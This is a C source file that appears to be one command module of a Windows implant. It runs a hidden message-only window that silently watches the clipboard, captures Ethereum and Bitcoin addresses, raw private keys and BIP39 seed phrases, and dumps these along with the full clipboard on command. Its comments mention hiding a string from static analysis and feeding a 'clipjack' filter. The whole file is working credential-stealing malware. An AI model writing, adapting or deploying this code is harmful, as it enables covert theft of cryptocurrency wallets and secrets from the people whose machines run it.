/*
 * clipboard.c — background clipboard monitor
 *
 * Hidden HWND_MESSAGE window + AddClipboardFormatListener.
 * Filters for crypto/credential content:
 *   ETH (0x+40hex), BTC (1/3/bc1), raw keys (64+ hex), BIP39 (12+ words)
 */

#include "commands.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#define CLIP_BUF_MAX   (64 * 1024)
#define CLIP_ENTRY_MAX  4096

static char              _cbuf[CLIP_BUF_MAX];
static size_t            _cpos    = 0;
static CRITICAL_SECTION  _ccs;
static HANDLE            _cthread = NULL;
static volatile LONG     _running = 0;

static int _is_hex(char c)   { return isxdigit((unsigned char)c); }
static int _is_lower(char c) { return c >= 'a' && c <= 'z'; }

static int _interesting(const char *t, size_t len)
{
    if (len < 10 || len > CLIP_ENTRY_MAX) return 0;

    if (len >= 42 && t[0] == '0' && t[1] == 'x') {
        int ok = 1;
        for (int i = 2; i < 42; i++) if (!_is_hex(t[i])) { ok = 0; break; }
        if (ok) return 1;
    }

    if ((t[0] == '1' || t[0] == '3') && len >= 25 && len <= 34) return 1;

    if (len >= 42 && t[0]=='b' && t[1]=='c' && t[2]=='1') return 1;

    if (len >= 64) {
        int ok = 1;
        for (size_t i = 0; i < 64; i++) if (!_is_hex(t[i])) { ok = 0; break; }
        if (ok) return 1;
    }

    int words = 0;
    const char *p = t;
    int valid = 1;
    while (*p && valid) {
        while (*p == ' ') p++;
        if (!*p) break;
        const char *ws = p;
        while (*p && *p != ' ' && *p != '\n' && *p != '\r') p++;
        size_t wl = (size_t)(p - ws);
        if (wl < 3 || wl > 8) { valid = 0; break; }
        for (size_t k = 0; k < wl; k++)
            if (!_is_lower(ws[k])) { valid = 0; break; }
        if (valid) words++;
    }
    if (valid && words >= 12) return 1;

    return 0;
}

static void _capture(void)
{
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (!h) { CloseClipboard(); return; }
    const char *text = (const char *)GlobalLock(h);
    if (!text) { CloseClipboard(); return; }

    size_t len = 0;
    while (len < CLIP_ENTRY_MAX && text[len]) len++;

    if (_interesting(text, len)) {
        EnterCriticalSection(&_ccs);
        if (_cpos + len + 32 < CLIP_BUF_MAX) {
            char probe[33] = {0};
            size_t plen = len < 32 ? len : 32;
            memcpy(probe, text, plen);
            if (!_cpos || !strstr(_cbuf, probe)) {
                int n = snprintf(_cbuf + _cpos, CLIP_BUF_MAX - _cpos - 1,
                                 "[clip] %.*s\n", (int)len, text);
                if (n > 0 && (size_t)n < CLIP_BUF_MAX - _cpos - 1)
                    _cpos += (size_t)n;
            }
        }
        LeaveCriticalSection(&_ccs);
    }

    GlobalUnlock(h);
    CloseClipboard();
}

static LRESULT CALLBACK _wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    if (msg == WM_CLIPBOARDUPDATE) { _capture(); return 0; }
    return DefWindowProcA(hwnd, msg, wp, lp);
}

static DWORD WINAPI _thread_fn(LPVOID arg)
{
    (void)arg;
    /* window class name as char array — avoids plaintext string in .rdata */
    char cls[] = {'P','h','C','l','i','p','W','n','d',0};
    WNDCLASSA wc = {0};
    wc.lpfnWndProc   = _wndproc;
    wc.hInstance     = GetModuleHandleA(NULL);
    wc.lpszClassName = cls;
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(0, cls, NULL, 0,
                                0, 0, 0, 0, HWND_MESSAGE,
                                NULL, GetModuleHandleA(NULL), NULL);
    if (!hwnd) { InterlockedExchange(&_running, 0); return 1; }

    AddClipboardFormatListener(hwnd);
    _capture();

    MSG msg;
    while (InterlockedCompareExchange(&_running, 1, 1) &&
           GetMessageA(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    RemoveClipboardFormatListener(hwnd);
    DestroyWindow(hwnd);
    return 0;
}

static void _start(void)
{
    if (InterlockedCompareExchange(&_running, 1, 0) == 0) {
        InitializeCriticalSection(&_ccs);
        _cthread = CreateThread(NULL, 0, _thread_fn, NULL, 0, NULL);
    }
}

/* _snapshot: direct clipboard read, no filter — for on-demand dump */
static int _snapshot(char *out, size_t outsz)
{
    if (!OpenClipboard(NULL)) return -1;

    /* prefer Unicode so we don't lose non-ASCII */
    HANDLE h = GetClipboardData(CF_UNICODETEXT);
    if (h) {
        const wchar_t *ws = (const wchar_t *)GlobalLock(h);
        if (ws) {
            int n = WideCharToMultiByte(CP_UTF8, 0, ws, -1,
                                        out, (int)(outsz - 1), NULL, NULL);
            GlobalUnlock(h);
            CloseClipboard();
            if (n > 0) { out[n] = '\0'; return n; }
        }
        GlobalUnlock(h);
    }

    /* fallback: CF_TEXT (ANSI) */
    h = GetClipboardData(CF_TEXT);
    if (h) {
        const char *text = (const char *)GlobalLock(h);
        if (text) {
            size_t len = 0;
            while (len < outsz - 1 && text[len]) len++;
            memcpy(out, text, len);
            out[len] = '\0';
            GlobalUnlock(h);
            CloseClipboard();
            return (int)len;
        }
        GlobalUnlock(h);
    }

    CloseClipboard();
    return 0;
}

int cmd_clipboard_dump(const char *args, char *out, size_t outsz)
{
    (void)args;

    /* start background monitor (also feeds clipjack crypto filter) */
    _start();

    /* direct snapshot of current clipboard — no content filter */
    char snap[CLIP_BUF_MAX];
    snap[0] = '\0';
    int sn = _snapshot(snap, sizeof(snap));

    /* also flush whatever the background monitor accumulated */
    EnterCriticalSection(&_ccs);
    size_t mon_len = _cpos;
    char *mon_buf = mon_len ? _cbuf : NULL;

    size_t pos = 0;

    if (sn > 0) {
        int n = snprintf(out + pos, outsz - pos, "[clipboard]\n%.*s\n", sn, snap);
        if (n > 0) pos += (size_t)n;
    }

    if (mon_buf && mon_len) {
        size_t copy = mon_len < outsz - pos - 1 ? mon_len : outsz - pos - 1;
        memcpy(out + pos, mon_buf, copy);
        pos += copy;
        out[pos] = '\0';
        memset(_cbuf, 0, copy + 1);
        _cpos = 0;
    }

    LeaveCriticalSection(&_ccs);

    if (pos == 0) {
        snprintf(out, outsz, "[clip] clipboard empty\n");
        return 1;
    }
    return 0;
}
